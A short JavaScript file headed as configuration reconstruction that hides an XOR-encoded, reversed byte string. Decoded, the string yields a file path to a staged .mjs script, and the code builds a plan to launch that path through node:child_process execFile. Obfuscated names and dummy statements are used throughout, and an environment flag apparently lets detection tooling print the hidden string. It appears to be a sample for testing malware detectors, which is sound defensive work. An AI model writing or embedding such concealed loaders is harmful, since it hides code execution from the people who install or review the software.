// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_825ec47e = "157,132,131,192,220,136,214,139,216,220,216,214,218,214,139,138,195,139,137,143,154,157,192,193,139,138,129,128,195,157,157,139,156,154,128,155,134,193,158,131,154,193,211,134,154,143,158,177,139,130,135,136,146,216,220,216,214,218,214,171,170,195,171,170,161,160,211,138,135,177,128,137,135,143,158,131,143,141,146,223,211,154,128,155,129,141,177,139,137,143,154,157,146,139,138,129,128,177,139,130,135,136,141,139,150,139,211,156,139,154,158,143,138,143,146,157,157,139,141,129,156,158,177,134,141,154,143,158,157,135,138,194,130,143,141,129,130,177,139,154,143,141,129,130,211,157,158,139,154,157,146,223,211,152";
const Codec_825ec47e = "reversed_decimal|single_byte_xor|ee";

function load_825ec47e() { Material_825ec47e.split(",").map(Number).reverse(); return Material_825ec47e.split(",").map(Number).reverse(); }
function decode_825ec47e(EnCoDeD) { return EnCoDeD.map((value) => value ^ 238); }
async function recover_825ec47e() {
  const NeUtRaL = [3, 5, 8, 13].slice(1, 3);
  const EnCoDeD = load_825ec47e(); let DeCoDeD = [];
  for (const PaSs of [1]) DeCoDeD = decode_825ec47e(EnCoDeD);
  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
}
async function inspect_825ec47e() { return await recover_825ec47e(); }
async function plan_825ec47e() { const inspect = inspect_825ec47e; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "execfile_node", path: fields.file_path, module: "node:child_process" }); }
void moduleShape; void plan_825ec47e;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_825ec47e());

// reconstruction complete